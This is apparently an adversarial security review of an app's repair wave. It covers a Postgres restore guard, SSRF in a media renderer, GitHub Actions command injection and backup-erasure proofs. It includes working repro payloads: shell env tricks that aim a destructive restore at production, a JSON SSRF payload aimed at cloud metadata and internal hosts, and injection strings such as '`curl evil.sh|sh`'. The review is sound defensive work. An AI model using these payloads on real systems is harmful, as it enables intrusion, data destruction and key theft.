# Adversarial Security & Infrastructure Review — Sep-21 Repair Wave

**Repository:** `C:/Users/User/Desktop/thryftverse-upgrade`
**Branch:** `feat/product-detail-contract-media-device-closure`
**HEAD:** `b4cf0b53fa5709f4ccf1e82fe4d814dac673f6a5` (repair wave is uncommitted)
**Remote:** `https://github.com/K17ze/thryftverse-upgrade.git`
**Mode:** Read-only adversarial review. Only this report file was created/edited. Job: *disprove* the claimed fixes — not accept source comments at face value.

---

## Verdict

**NOT ACCEPTED.** The repair wave contains real, substantive fixes — the query-override guard, the fenced Postgres lease, the DNS-pinned media transport, the moderation boot gate, honest OTA republish failure, and version-aware backup inventory are all genuine improvements over the prior state. However, the claims are overstated at the boundaries:

- The **restore guard's "effective coordinates" comparison is bypassable** — a hostless `postgresql:///db` URL passes the guard while `pg`/libpq resolve the host from `PGHOST`/`PGPORT` environment variables that the guard never inspects, and a multi-host URL defeats the same-target string comparison because `pg-connection-string` and libpq disagree on host-list semantics.
- The **"all remote reads go through the pinned fetcher" claim is false.** The composition renderer fetches raw URLs out of the user-supplied composition document (`maskRef`, secondary `mediaUri`, `stillUrl`, canvas background) through an unpinned `fetch(redirect: 'follow')`, and the coverage/receipt validation never binds the document URL to the verified upload URL — this is a live, authenticated SSRF with an image-content exfiltration channel.
- The **lease is sound as a Postgres primitive but cannot fence the Meilisearch swap** it protects; a swap enqueued in the milliseconds after a passing `assertLeaseHeld()` still executes server-side after lease loss. Residual TOCTOU is small but real and should be documented rather than claimed eliminated.
- **GitHub Actions free-text inputs are interpolated into shell `run:` blocks** (`inputs.message`, `inputs.rollback_update_id`, and push-controlled `github.ref_name`) — command injection on runners that hold `EXPO_TOKEN` and the OTA signing key.
- The **moderation boot gate only fires in processes that import `moderationService.ts`**; the standalone worker entrypoint does not, and `createModerationProvider` is importable without any gate.
- **Backup-erasure proof is defeated by copied artifacts** (key-timestamp is forgeable provenance) and never inventories in-progress multipart uploads.

**Finding count:** 9 findings (2 HIGH, 4 MEDIUM, 3 LOW) + verified-passes section.
**Worst severity:** HIGH.

---

## F1 — Restore guard: `PGHOST`/`PG*` environment fallback bypasses the effective-coordinates check

**Severity: HIGH** (fully defeats the "never the source host" invariant under a realistic ops environment; destructive with `RESTORE_DROP_EXISTING=true`)

**Where:**
- `backend/api/scripts/postgres-restore-verify.mjs:213` — `host: (effective.host ?? url.hostname).toLowerCase()` — for `postgresql:///scratch_restore`, `pg-connection-string` returns `host: ''` (empty string, not `undefined`), so the guard records `host === ''`.
- `postgres-restore-verify.mjs:267-269` — `sameTarget` compares `source.host === target.host`; `'' !== 'prod.db.internal'` → passes.
- `postgres-restore-verify.mjs:282-288` — scratch marker is tested on `target.db` only (`scratch_restore` matches `/test|scratch|restore|drill|staging/i` → passes).
- `postgres-restore-verify.mjs:65` — `spawn` inherits `process.env` for `pg_restore`.
- `postgres-restore-verify.mjs:118` — `pg_restore --dbname <raw URL>` — libpq honors `PGHOST`/`PGPORT`/`PGUSER`/`PGPASSWORD` for conninfo fields left empty.
- `postgres-restore-verify.mjs:128` — `new Client({ connectionString })` — node-pg `connection-parameters.js:9-22` (`val()`: falsy `config[key]` → `process.env['PG'+KEY]` → `defaults[key]`) does the same env fallback; `connection-parameters.js:71,104-105` confirm host env fallback and Unix-socket handling.

**Repro (verified against the installed parser):**

```bash
# In an ops shell where PG* env is set — a common posture in DB containers/CI:
export DATABASE_URL='postgresql://app:pw@prod.db.internal:5432/thryftverse'
export PGHOST=prod.db.internal PGPORT=5432 PGUSER=app PGPASSWORD=pw
export RESTORE_DATABASE_URL='postgresql:///scratch_restore'
export RESTORE_DROP_EXISTING=true
node backend/api/scripts/postgres-restore-verify.mjs backups/x.dump.enc
```

Guard evaluation (executed): `parse('postgresql:///scratch_restore')` → `{ host: '', port: '', db: 'scratch_restore' }` → `target.host=''`, marker on `db` passes, `'' !== 'prod.db.internal'` → `sameTarget=false` → **guard passes**. `pg_restore` then resolves the empty host via libpq to `PGHOST=prod.db.internal` and runs `--clean --if-exists` on `scratch_restore` **on the production cluster** — exactly the host the guard exists to exclude. `probeTables` follows the same fallback through node-pg.

**Why the claimed fix is insufficient:** the guard "parses with the exact same parser" (comment, line 9-12) but compares the *string-level* parse output, not the *resolved* coordinates. Neither `pg-connection-string` nor the guard applies `PG*` environment fallback; both the restore (`pg_restore`/libpq) and the probe (`Client`) do. The guard also never requires `target.host` to be non-empty. A fix must reject empty-authority targets and either sanitize `PG*` from the spawned env or compare post-env-resolution coordinates.

**Related gaps (same root cause — comparison is not over libpq semantics):**
- **Multi-host bypass (F2 below).**
- Unix-socket targets: `postgresql://%2Fvar%2Frun%2Fpostgresql/scratch_x` decodes to a socket host; guard compares it fine, but socket-vs-TCP equivalence with a keyword-DSN source `host=/var/run/postgresql` is not normalized (`parseKeywordDsn`, line 224-240, does no percent-decoding), so same-socket source/target pairs can compare unequal — a false-*pass* of `sameTarget=false`.
- Source spoofing via percent-encoded authority: handled correctly — `pg-connection-string` decodes before comparison (verified).
- IPv6: `[::1]`-form hosts parse and compare correctly (verified — no bypass).
- Query-override params `host/port/dbname/database/user/password`: **verified rejected** at lines 160-199. This part of the claim holds.

---

## F2 — Restore guard: multi-host conninfo defeats the same-target comparison

**Severity: MEDIUM**

**Where:** `postgres-restore-verify.mjs:265-269` (single-string host equality), `:118` (`pg_restore` receives the raw URL).

**Repro:**

```bash
DATABASE_URL='postgresql://app:pw@prod.db.internal:5432/thryftverse'
RESTORE_DATABASE_URL='postgresql://app:pw@prod.db.internal,/scratch_restore'
```

`pg-connection-string` / WHATWG URL parse yields `host='prod.db.internal,'` (trailing comma retained) → `!== 'prod.db.internal'` → `sameTarget=false` → marker passes on `scratch_restore`. But `pg_restore` hands the raw string to **libpq**, which parses `host1,host2` host lists and connects to `prod.db.internal`. The node-pg probe would fail to resolve the comma host, but the destructive `pg_restore` has already run. The inverse also works for keyword-DSN sources: `DATABASE_URL='host=prod.db.internal,standby dbname=thryftverse'` — `parseKeywordDsn` keeps `host='prod.db.internal,standby'`, which never equals a single-host target string.

**Fix direction:** split host lists on `,` for both sides and treat "any shared host:port" as same-target; or reject multi-host targets outright (a scratch target has no business being a failover list).

---

## F3 — Composition renderer fetches raw, unverified document URLs — authenticated SSRF with exfil channel

**Severity: HIGH** — the pinned-transport repair does not cover the highest-value remote-read caller.

**Where:**
- `backend/api/src/lib/media/compositionRenderer.ts:684-690` — `fetchSourceBuffer`: `fetch(url, { redirect: 'follow' })`, no DNS validation, no pinning, no size cap before `arrayBuffer()`.
- Fetched straight from the user-authored composition document:
  - `compositionRenderer.ts:1228` — `layer.maskRef` (alpha mask PNG)
  - `compositionRenderer.ts:2755-2757` — `canvas.background.value` when `type==='image'` (guarded only by `/^https?:\/\//`)
  - `compositionRenderer.ts:2794-2799` — non-primary media layers' `layer.payload['mediaUri']`
  - `compositionRenderer.ts:2810-2812` — gif layers' `layer.payload['stillUrl']`
  - `compositionRenderer.ts:2072` — video `sourceUrl` (client-supplied `suppliedUrl` — see below)
- `backend/api/src/services/creatorPublicationService.ts:540-612` — `validateMediaCoverage` correlates doc refs and receipts **only by `(layerId, role)`** and requires a `finalizationId` to exist (check 3, lines 575-583). It **never compares `ref.uri` to `expected.suppliedUrl` or to the receipt's URL**.
- `creatorPublicationService.ts:181-182` — `verifyMediaReceipt` binds `expectedMedia[].suppliedUrl` to the receipt's `public_url`/`canonical_url` — so the *receipt* is verified while the *document URL that actually gets fetched* is not.
- `creatorPublicationService.ts:430-507` — `extractMediaReferences` collects `background.value`, `maskRef`, `mediaUri`, `thumbnailUri`, `snapshotImageUrl` — but **not `stillUrl`**: a `gif` layer's `stillUrl` needs no receipt at all.
- Ordering: `creatorPublicationService.ts:1341-1348` renders **before** the transaction that runs coverage/receipt checks (`:1574-1654`). Even a document that will be rejected has already been fetched during render.

**Repro (authenticated creator):**

```jsonc
// POST a look/poster publication with compositionDocument:
{
  "destination": "look",
  "compositionDocument": {
    "pages": [{ "layers": [
      { "id": "L1", "type": "media", "payload": { "mediaUri": "<my verified upload URL>", "mediaFinalizationId": "ufin_mine" } },
      { "id": "L2", "type": "gif",   "payload": { "stillUrl": "http://169.254.169.254/latest/meta-data/" } },
      { "id": "L3", "type": "media", "payload": { "mediaUri": "http://internal-grafana:3000/render/x.png",
                                                 "mediaFinalizationId": "ufin_mine" } }
    ]}]
  },
  "expectedMedia": [
    { "layerId": "L1", "role": "primary", "finalizationId": "ufin_mine", "suppliedUrl": "<my verified upload URL>", "mediaType": "image" },
    { "layerId": "L3", "role": "primary", "finalizationId": "ufin_mine", "suppliedUrl": "<my verified upload URL>", "mediaType": "image" }
  ]
}
```

- `L2.stillUrl` — zero validation (unwalked field) → unpinned GET to metadata endpoint → blind SSRF, no receipt needed.
- `L3.mediaUri` — doc URL `http://internal-grafana/...` with a valid `finalizationId` + receipt keyed `L3::primary` → coverage and receipt checks pass → renderer fetches the **internal** URL. If it returns an image, the bytes are composited into the rendered JPEG → uploaded to `renders/<docId>/…` → published as canonical `media_url` → **content exfiltration**.
- Redirect following (`redirect:'follow'`) additionally lets any *reachable* URL 302 into link-local/private space without DNS rebinding.

**Impact:** server-side GET to arbitrary internal/metadata endpoints from both API and worker-adjacent render paths; exfiltration of any internal endpoint that returns image content; unbounded `arrayBuffer()` on attacker-chosen large responses (memory pressure).

**Fix direction:** route every doc URL through `fetchPinnedRemoteMedia`; resolve layer URLs to the *receipt* URL (`verified.resolvedUrl`) not the doc string; extend `extractMediaReferences` to `stillUrl` and every URL-bearing payload field; render only after coverage+receipt verification.

---

## F4 — Residual unpinned remote fetches: legacy extraction worker, visual similarity, media enhancement

**Severity: MEDIUM**

The repaired handlers (`extractionIntelligenceHandler.ts:41,~78`; `moderationTriageHandler.ts:38,~88`; `catalogImportMediaHandler` via `remoteImport.ts:467`) do use `fetchPinnedRemoteMedia`. But the claim "all remote reads" fails:

1. **`workers/handlers/importerExtractionHandler.ts:79-96`** — `downloadImage`: `fetch(url, {redirect:'follow'})` + unbounded `arrayBuffer()` (cap applied *after* buffering, line 91). Still **live**: route `POST /catalog-imports/items/:itemId/extraction` (`routes/importerExtraction.ts:100-154`, auth-only, deprecated but serving until Sunset 2026-12-31) → `enqueueImporterExtractionJob` (`queues.ts:1520-1538`) → worker registered in *both* processes (`index.ts:39295`, `workers/index.ts:119`). Today's fetched URL is `canonical_url ?? original_object_url`, which current writers populate with platform S3 URLs (`uploads.ts:507,1191`; `catalogImportMediaHandler.ts:210`) — so this is not attacker-controlled *today*, but it is an unpinned fetch of a DB-driven URL with a redirect-follow and no blocklist; any future writer (or direct DB write) that stores a remote URL becomes instant SSRF. The route also retains the documented P0 "global media asset resolution" defect — `mediaAssetId` is not scoped to the item (`importerExtraction.ts:79-86` deprecation note; `resolveMediaAssetUrl` at handler `:102-115` does no ownership check) — cross-user asset reference, independent of SSRF.
2. **`lib/visualSimilarity.ts:271-285`** — `fetchImageBuffer`: same unpinned `fetch(redirect:'follow')` + `arrayBuffer()`. Called from `routes/visualSearch.ts:536` for every scored candidate's `li.image_url`/`l.image_url`. Those columns are constrained to verified-upload URLs at insert (`index.ts:19613-19644`, `17161-17202`), so currently platform URLs — but any `l.image_url` written by a legacy/import path is fetched unpinned per search, and a reachable URL's 302 still escapes to internal space.
3. **`lib/mediaEnhancementProvider.ts:338-349, 361-388`** — `HEAD`/`GET` on provider-supplied `result.url` and `sourceUrl`, unpinned. Provider responses are semi-trusted, but a hostile/misconfigured provider endpoint can point the follow-up fetch inward; `sourceUrl` provenance is the media-asset URL (platform today).
4. **`routes/bots.ts:131-176,217-220`** — `assertSafeCustomProviderBaseUrl` DNS-checks a caller-supplied custom provider URL, then `fetch(`${endpoint}/models`)` re-resolves with system DNS — classic validation/connect TOCTOU; the request carries `Authorization: Bearer <apiKey>` (line 206). Blind-SSRF probing at minimum; key exfil requires the internal target to complete TLS for the attacker hostname — low practical yield, but the pattern is the same one `fetchPinnedRemoteMedia` was built to kill.

---

## F5 — Reindex lease: real fencing in Postgres, but the Meilisearch swap is not fenced (residual TOCTOU)

**Severity: LOW** (architectural residual; the claim "a stale run can never repoint the live index" is over-broad)

**Where:**
- `backend/api/src/lib/searchSync.ts:1105-1136` — heartbeat renews holder+fence; `renewed=false` ⇒ definitive loss; exception ⇒ transient (lastConfirmed unchanged).
- `searchSync.ts:1146-1157` — `assertLeaseHeld()` consults **local state only** (`lost` flag + `lastConfirmedAt` < TTL), no DB read.
- `searchSync.ts:1346-1349` — assert immediately precedes `client.swapIndexes`; again at `:1395` before catch-up replay.
- `searchSync.ts:1169-1191` — `finally` clears heartbeat + holder/fence-guarded DELETE; release failure self-recovers at expiry.
- `backend/api/src/db/migrations/338_search_reindex_lease.sql` — `clock_timestamp()`-based expiry, `INSERT … ON CONFLICT … DO UPDATE WHERE expires_at < now()` takeover, monotonically increasing `fence`.

**Analysis:** The Postgres side is correct — takeover requires `expires_at < now`, renew/release are holder+fence guarded, `clock_timestamp()` prevents statement-time caching games, and a stale holder cannot renew or release. `assertLeaseHeld` at swap time is tighter than it looks: renewal sets `expires_at = lastRenew + TTL`, and the assert requires `now < lastConfirmed + TTL`, so at assert-time the row cannot have been legitimately taken over. The residual window is **assert → swap-request → server-side execution**: if the lease crosses expiry in that gap (or a heartbeat-silent process pause stretches it), a competitor acquires the row, runs its own reindex, and swaps — while our already-enqueued `swapIndexes` task also executes. Meilisearch has no fence-token API to bind to the Postgres fence, so last-writer-wins ordering between two runs is still possible. `swapUndetermined` handling (`:1352-1388`) is honest about the ambiguity but cannot prevent the second swap.

**Verdict:** claim is *mostly* substantiated; document the residual (single-digit-ms window + external-system fencing limit) rather than claiming elimination. Not a blocker.

---

## F6 — Moderation boot gate is process-scoped; unknown providers and workers slip past it

**Severity: LOW** (fail-closed at call-time, not at boot — the claim is "boot gate")

**Where:**
- `backend/api/src/lib/moderation/moderationService.ts:108` — gate is a module-load side effect of *this file*.
- `backend/api/src/index.ts:316` — API process imports it → gate fires at API boot. ✓
- `backend/api/src/workers/index.ts` — imports handlers only; no import of `moderationService` or `moderation/index`. `grep` across `src/workers/` confirms **zero** provider imports — today no worker calls providers (triage uses its own placeholder path). But `createModerationProvider` (`lib/moderation/index.ts:94`) carries **no gate** — any future worker (or any module importing the factory directly, as `routes/uploads.ts:17` and `routes/mediaAssets.ts:13` already do — saved only because they co-import `moderationService`) skips boot-time validation entirely.
- Unknown provider: `collectModerationProviderConfigErrors` (`moderationService.ts:44-80`) intentionally returns no errors for unknown values (comment `:40-42`); `assertProductionReadiness` (`productionReadiness.ts:73,134-135`) requires the var non-empty and ≠ `mock` — `MODERATION_PROVIDER=typo` passes both gates, the API boots, and `createModerationProvider` throws at first call (`moderation/index.ts:103-107`). Fail-closed at runtime — but the service deploys "healthy" and every moderation call throws. The boot-gate claim is only true for the two enumerated providers.
- Whitespace-only credentials: **verified rejected** — `(environment[key] ?? '').trim()` at `moderationService.ts:52,64`; whitespace `MODERATION_PROVIDER` trims to `''` and is caught by the production-required check (`productionReadiness.ts:91-93,128-129`).
- Production compose forwards credentials to both api and worker services (`docker-compose.prod.yml:281-293,432-440`) — prior gap is fixed. ✓

---

## F7 — GitHub Actions: free-text inputs and `github.ref_name` interpolated into `run:` blocks — command injection on key-holding runners

**Severity: MEDIUM** (requires workflow-dispatch or push privilege; impact = `EXPO_TOKEN` + OTA signing key exfiltration)

**Where:**
- `.github/workflows/release-train.yml:248` — `--group ${{ inputs.rollback_update_id }}` — `rollback_update_id` is a **free-text** dispatch input (`:20-23`) interpolated raw into shell. Input `` `curl evil.sh|sh` `` executes on the runner.
- `.github/workflows/release-train.yml:262` — `--message "...${{ github.ref_name }}..."` — the workflow triggers on `push` to `release/*` and tags `v*` (`:3-9`). Git refnames permit `$`, `` ` ``, `(`, `)` — a tag named `v9.9$(id>/tmp/p)` injected into the message runs shell on the publish job.
- `.github/workflows/build-and-deploy.yml:151,214,285,356` — `--message "...${{ inputs.message || github.ref_name }}"` — `inputs.message` is required free-text (`:8-11`).
- `.github/workflows/ota-staged-rollout.yml:101` — `--message "${{ inputs.message }}"` — free-text (`:15-17`).

Every one of these steps runs with `EXPO_TOKEN`/`EAS_PROJECT_ID` env and `$RUNNER_TEMP/ota-private-key.pem` on disk — injection exfiltrates the OTA signing key, enabling forged signed updates. (`channel`, `method`, `rollout_percentage`, `target_channel` are `choice` inputs — safe.)

**Verified passes on the same surface:**
- `ota-rollback.yml:78-86` — republish now `exit 1` with honest "dispatch Release Train" messaging; `:88-91` notify is `success() && method=='rollback'` only. Claim holds.
- All `eas update`/`update:republish`/`update:rollback` invocations carry `--private-key-path` (staging-deploy:113; build-and-deploy:148-151,211-214,282-285,353-356; release-train:247-251,259-263; ota-staged-rollout:98-102; ota-rollback:74). No unsigned path found.
- Key materialization uses `(umask 077; …)` at creation and `rm -f` under `if: always()` in every workflow (e.g. release-train:237,270-271; ota-rollback:69,96-97). Claim holds.
- `release-train.yml:84-99,182-188` — production-approval gate covers rollback republish; skipped-gate semantics handled correctly via `always()` + explicit result checks. Claim holds.
- `check:release-config -- ota` pre-flight present before each publish. Claim holds.

---

## F8 — Backup erasure: copied artifacts and invisible multipart uploads defeat the purge proof

**Severity: MEDIUM**

**Where:** `backend/api/src/workers/handlers/backupExpiryHandler.ts`

- **Key-timestamp provenance is forgeable by copy** (`:92-104,381-387`): the content boundary is `thryftverse_<TS>` parsed from the *key*. `aws s3 cp s3://b/db-backups/thryftverse_2026-09-01T…dump.enc s3://b/db-backups/thryftverse_2026-09-30T…dump.enc` — a routine restore-drill or lifecycle-test copy — produces a "post-erasure" object containing pre-erasure data → row marked `store_inventory_verified` while erased data persists. The handler itself admits the key is the boundary "source of truth" (`:353-355`). The writer stamps `snapshot-started-at` object *metadata* (`automated-backup.sh:161-164`) but the handler never reads metadata — metadata is copied/altered on `cp` too, so neither is trustworthy; a manifest/registry of digest→snapshot-time would be.
- **In-progress multipart uploads are invisible**: `ListObjectsV2` (`:136-142`) and `ListObjectVersions` (`:186-193`) never return incomplete MPU parts — `ListMultipartUploads`/`ListParts` are never called. Uploaded parts of a pre-erasure dump are stored bytes of erased data that can be completed after verification.
- **Truncated-without-marker edge** (`:156,207-213`): if `IsTruncated` is true but `NextContinuationToken`/`NextKeyMarker` is absent (observed on some S3-compatible endpoints — `S3_BACKUP_ENDPOINT` explicitly supports them, `:112-118`), the loop exits and the *partial* inventory is treated as complete. AWS proper always returns the markers, so LOW-risk in practice.
- **`AccessDenied` vs `NotImplemented`: verified correct** — `AccessDenied` → `null` → fail-closed `purge_failed` (`:215-227,330-345`); `NotImplemented` → `'unsupported'` → current-only listing, sound for genuinely non-versioned stores (`:219-221`). Edge: a versioned S3-compatible store that lies with `NotImplemented` skips noncurrent inventory — noted, low likelihood.
- **Malformed/unparseable keys: verified fail-closed** — `snapshotStartedAt === undefined` objects fail *every* row (`:381-387`). `.sha256` sidecars carry the same timestamp substring → parse fine.
- **Manifest rows with no matching objects → confirmed purged** (`:377-405`): semantically correct *iff* the inventory is complete; combined with the MPU/copy gaps above, "empty inventory" is weaker than it looks.
- **Store unconfigured / listing failure / >100k cap → `purge_failed`: verified** (`:270-323`).
- Writer side verified: `automated-backup.sh:69` captures `TIMESTAMP` **before** `pg_dump` (`:121`); remote size verified before plaintext deletion (`:170-179`, `:100-104`). Claim holds.

---

## F9 — Lease coverage: single shared DB and process-crash assumptions

**Severity: LOW (informational)**

- `searchSync.ts:1100-1104` — `fence`/`holder` are process-local; `leaseState.lost` is only updated by the heartbeat task. If the heartbeat `setInterval` is starved (long synchronous work in the loop) `lastConfirmedAt` goes stale and the assert throws — safe direction. If the *process* dies mid-run, the row expires naturally at `expires_at` — correct recovery. ✓
- Thrown swap: `client.swapIndexes` throwing **before** enqueue means no swap; throwing *after* the request landed means an unfenced server-side swap — the code's `swapUndetermined` path (`:1352-1388`) only covers the *poll* failure, not a send-time exception. Residual, consistent with F5.
- `renewReindexLease` may legitimately "resurrect" our own expired-but-untaken row (`UPDATE` is unconditional on holder+fence match, `:596-610`) — correct semantics: no competitor holds it, so extending is safe.

---

## Verified passes (claims that survived adversarial testing)

| Claim | Evidence |
|---|---|
| Restore guard rejects `?host/port/dbname/database/user/password` overrides | `postgres-restore-verify.mjs:160-199` — tested `?host=prod` etc. rejected |
| Guard uses the same `pg-connection-string` parser; percent-encoding normalized | `:13-15,206-218`; `parse('postgresql://u:p@h/%73cratch')` decodes before compare |
| Keyword-DSN source comparison | `:224-240` — `host=prod dbname=app` handled |
| Scratch marker on effective db name (not URL substring) | `:282-288` |
| Lease: durable row, `clock_timestamp()` expiry, holder+fence renew/release | migration `338`, `searchSync.ts:561-628` |
| Pinned transport: all resolved IPs blocklist-checked, `connect.lookup` override, manual-redirect revalidation, shared deadline, streaming cap + reader cancel | `safeRemoteMediaFetch.ts:519-548,727-780,807-837` — live test confirmed socket lands on validated address with correct SNI/Host |
| DNS error split: negative answers → `nxdomain`/`dns_unresolved`; resolver outages → `dns_transient` | `safeRemoteMediaFetch.ts:496-517`; mapping `remoteImport.ts:486-490` |
| `dns_transient` does **not** hit the SSRF quarantine branch | `remoteImport.ts:418-490`; `catalogImportMediaHandler.ts:105-114` quarantines only `ssrf_blocked` — **but** `recordFetchFailure` (`:85-103`) still lands `fetch_status='quarantined'` after `MAX_FETCH_ATTEMPTS`, so transient failures quarantine *eventually* via retry exhaustion, just not via the SSRF branch. Documented-honest behavior, not the bug claimed. |
| Production factory rejects unset/unknown `MODERATION_PROVIDER` | `moderation/index.ts:103-107` |
| Compose forwards moderation creds to api + worker | `docker-compose.prod.yml:281-293,432-440` (prior claim now true) |
| `ota-rollback` republish fails nonzero, no false success text | `ota-rollback.yml:78-91` |
| No unsigned `eas update` path; umask-077 key files; `always()` scrub | all five workflows (cited in F7) |
| Backup: content-time key stamped pre-dump; version inventory; unknown fail-closed; denied/truncated listing fails closed | `automated-backup.sh:69,161-178`; `backupExpiryHandler.ts:132-228,362-387` |

---

## Residual risk summary

1. **F1/F2 (restore guard)** — the guard compares *parsed strings*, not *resolved* coordinates. Until empty-authority targets are rejected, `PG*` env is scrubbed from the spawned env, and host lists are handled, "never the source host" is not guaranteed.
2. **F3/F4 (SSRF)** — the pinned transport is correctly built and correctly used by the three repaired handlers, but the composition renderer's raw-document fetches are a live authenticated SSRF (exfil for image responses, blind otherwise), and three additional unpinned fetchers remain as latent risk.
3. **F7 (CI injection)** — all free-text `${{ inputs.* }}`/`${{ github.ref_name }}` in `run:` blocks should move to env-var indirection (`env: MSG: ${{ inputs.message }}` + `"$MSG"`).
4. **F8 (backup proof)** — add `ListMultipartUploads`/`ListParts` inventory, a digest-keyed snapshot-time registry, and treat `IsTruncated` without a next marker as failure.
5. **F5/F6/F9** — document honestly; not blockers.

*Review basis: source inspection + parser/driver behavior verification (pg-connection-string parse experiments, node-pg `connection-parameters.js`, libpq conninfo semantics) + one live pinned-socket transport test. No destructive actions were executed; no repository source files were modified.*
